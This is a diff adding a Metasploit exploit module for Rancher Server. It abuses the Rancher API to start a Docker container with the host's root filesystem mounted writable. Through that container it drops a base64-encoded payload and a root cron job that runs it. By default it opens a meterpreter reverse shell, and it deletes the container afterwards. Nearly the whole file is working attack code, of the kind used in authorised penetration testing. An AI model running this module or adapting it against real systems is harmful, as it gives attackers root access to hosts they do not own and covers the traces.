@@ -1,0 +1,234 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'             => 'Rancher Server - Docker Exploit',
+      'Description'      => %q(
+        Utilizing Rancher Server, an attacker can create a docker container
+        with the '/' path mounted with read/write permissions on the host
+        server that is running the docker container. As the docker container
+        executes command as uid 0 it is honored by the host operating system
+        allowing the attacker to edit/create files owed by root. This exploit
+        abuses this to creates a cron job in the '/etc/cron.d/' path of the
+        host server.
+
+        The Docker image should exist on the target system or be a valid image
+        from hub.docker.com.
+
+        Use `check` with verbose mode to get a list of exploitable Rancher
+        Hosts managed by the target system.
+      ),
+      'Author'           => 'Martin Pizala', # started with dcos_marathon module from Erik Daguerre
+      'License'          => MSF_LICENSE,
+      'References'       => [
+        'URL'            => 'https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface'
+      ],
+      'Platform'         => 'linux',
+      'Arch'             => [ARCH_X64],
+      'Payload'          => { 'Space' => 65000 },
+      'Targets'          => [[ 'Linux', {} ]],
+      'DefaultOptions'   => { 'WfsDelay' => 75, 'Payload' => 'linux/x64/meterpreter/reverse_tcp' },
+      'DefaultTarget'    => 0,
+      'DisclosureDate'   => 'Jul 27, 2017'))
+
+    register_options(
+      [
+        Opt::RPORT(8080),
+        OptString.new('TARGETENV', [ true, 'Target Rancher Environment', '1a5' ]),
+        OptString.new('TARGETHOST', [ true, 'Target Rancher Host', '1h1' ]),
+        OptString.new('DOCKERIMAGE', [ true, 'hub.docker.com image to use', 'alpine:latest' ]),
+        OptString.new('CONTAINER_ID', [ false, 'container id you would like']),
+        OptString.new('HttpUsername', [false, 'Rancher API Access Key (Username)']),
+        OptString.new('HttpPassword', [false, 'Rancher API Secret Key (Password)'])
+      ]
+    )
+    register_advanced_options(
+      [
+        OptString.new('TARGETURI', [ true, 'Rancher API Path', '/v1/projects' ]),
+        OptInt.new('WAIT_TIMEOUT', [ true, 'Time in seconds to wait for the docker container to deploy', 60 ])
+      ]
+    )
+  end
+
+  def del_container(rancher_container_id, container_id)
+    res = send_request_cgi(
+      'method'  => 'DELETE',
+      'uri'     => normalize_uri(target_uri.path, datastore['TARGETENV'], 'containers', rancher_container_id),
+      'ctype'   => 'application/json',
+      'headers' => { 'Accept' => 'application/json' }
+    )
+
+    return vprint_good('The docker container has been removed.') if res && res.code == 200
+
+    print_warning("Manual cleanup of container \"#{container_id}\" is needed on the target.")
+  end
+
+  def make_container_id
+    return datastore['CONTAINER_ID'] unless datastore['CONTAINER_ID'].nil?
+
+    rand_text_alpha_lower(8)
+  end
+
+  def make_cmd(mnt_path, cron_path, payload_path)
+    vprint_status('Creating the docker container command')
+    echo_cron_path = mnt_path + cron_path
+    echo_payload_path = mnt_path + payload_path
+
+    command = "echo #{Rex::Text.encode_base64(payload.encoded_exe)} | base64 -d > #{echo_payload_path} \&\& chmod +x #{echo_payload_path} \&\& "
+    command << "echo \"PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin\" >> #{echo_cron_path} \&\& "
+    command << "echo \"\" >> #{echo_cron_path} \&\& "
+    command << "echo \"* * * * * root #{payload_path}\" >> #{echo_cron_path}"
+
+    command
+  end
+
+  def make_container(mnt_path, cron_path, payload_path, container_id)
+    vprint_status('Setting container json request variables')
+    {
+      'instanceTriggeredStop'           => 'stop',
+      'startOnCreate'                   => true,
+      'networkMode'                     => 'managed',
+      'requestedHostId'                 => datastore['TARGETHOST'],
+      'type'                            => 'container',
+      'dataVolumes'                     => [ '/:' + mnt_path ],
+      'imageUuid'                       => 'docker:' + datastore['DOCKERIMAGE'],
+      'name'                            => container_id,
+      'command'                         => make_cmd(mnt_path, cron_path, payload_path),
+      'entryPoint'                      => %w[sh -c]
+    }
+  end
+
+  def check
+    res = send_request_cgi(
+      'method'  => 'GET',
+      'uri'     => normalize_uri(target_uri.path),
+      'ctype'   => 'application/json',
+      'headers' => { 'Accept' => 'application/json' }
+    )
+
+    if res.nil?
+      print_error('Failed to connect to the target')
+      return Exploit::CheckCode::Unknown
+    end
+
+    if res.code == 401 && res.headers.to_json.include?('X-Rancher-Version')
+      print_error('Authorization is required. Provide valid Rancher API Keys.')
+      return Exploit::CheckCode::Detected
+    end
+
+    if res.code == 200 && res.headers.to_json.include?('X-Rancher-Version')
+      target_found = false
+      target_selected = false
+
+      environments = JSON.parse(res.body)['data']
+      environments.each do |e|
+        res = send_request_cgi(
+          'method'  => 'GET',
+          'uri'     => normalize_uri(target_uri.path, e['id'], 'hosts'),
+          'ctype'   => 'application/json',
+          'headers' => { 'Accept' => 'application/json' }
+        )
+
+        hosts = JSON.parse(res.body)['data']
+        hosts.each do |h|
+          target_found = true
+          result = "Rancher Host \"#{h['hostname']}\" (TARGETHOST #{h['id']}) on "
+          result << "Environment \"#{e['name']}\" (TARGETENV #{e['id']}) found"
+
+          # flag results when this host is targeted via options
+          if datastore['TARGETENV'] == e['id'] && datastore['TARGETHOST'] == h['id']
+            target_selected = true
+            vprint_good(result + ' %red<-- targeted%clr')
+          else
+            vprint_good(result)
+          end
+        end
+      end
+
+      if target_found
+        return Exploit::CheckCode::Vulnerable if target_selected
+
+        print_bad("Your TARGETENV \"#{datastore['TARGETENV']}\" or/and TARGETHOST \"#{datastore['TARGETHOST']}\" is not available")
+        if datastore['VERBOSE'] == false
+          print_bad('Try verbose mode to know what happened.')
+        end
+        vprint_bad('Choose a TARGETHOST and TARGETENV from the results above')
+        return Exploit::CheckCode::Appears
+      else
+        print_bad('No TARGETHOST available')
+        return Exploit::CheckCode::Detected
+      end
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    unless check == Exploit::CheckCode::Vulnerable
+      fail_with(Failure::Unknown, 'Failed to connect to the target')
+    end
+
+    # create required information to create json container information
+    cron_path = '/etc/cron.d/' + rand_text_alpha(8)
+    payload_path = '/tmp/' + rand_text_alpha(8)
+    mnt_path = '/mnt/' + rand_text_alpha(8)
+    container_id = make_container_id
+
+    # deploy docker container
+    res = send_request_cgi(
+      'method'  => 'POST',
+      'uri'     => normalize_uri(target_uri.path, datastore['TARGETENV'], 'containers'),
+      'ctype'   => 'application/json',
+      'headers' => { 'Accept' => 'application/json' },
+      'data'    => make_container(mnt_path, cron_path, payload_path, container_id).to_json
+    )
+    fail_with(Failure::Unknown, 'Failed to create the docker container') unless res && res.code == 201
+
+    print_good('The docker container is created, waiting for it to deploy')
+
+    # cleanup
+    register_files_for_cleanup(cron_path, payload_path)
+
+    rancher_container_id = JSON.parse(res.body)['id']
+    deleted_container = false
+
+    sleep_time = 5
+    wait_time = datastore['WAIT_TIMEOUT']
+    vprint_status("Waiting up to #{wait_time} seconds until the docker container stops")
+
+    while wait_time > 0
+      sleep(sleep_time)
+      wait_time -= sleep_time
+
+      res = send_request_cgi(
+        'method'  => 'GET',
+        'uri'     => normalize_uri(target_uri.path, datastore['TARGETENV'], 'containers', '?name=' + container_id),
+        'ctype'   => 'application/json',
+        'headers' => { 'Accept' => 'application/json' }
+      )
+      next unless res && res.code == 200 && res.body.include?('stopped')
+
+      vprint_good('The docker container has stopped, now trying to remove it')
+      del_container(rancher_container_id, container_id)
+      deleted_container = true
+      wait_time = 0
+    end
+
+    # if container does not deploy, try to remove it and fail out
+    unless deleted_container
+      del_container(rancher_container_id, container_id)
+      fail_with(Failure::Unknown, "The docker container failed to start")
+    end
+
+    print_status('Waiting for the cron job to run, can take up to 60 seconds')
+  end
+end
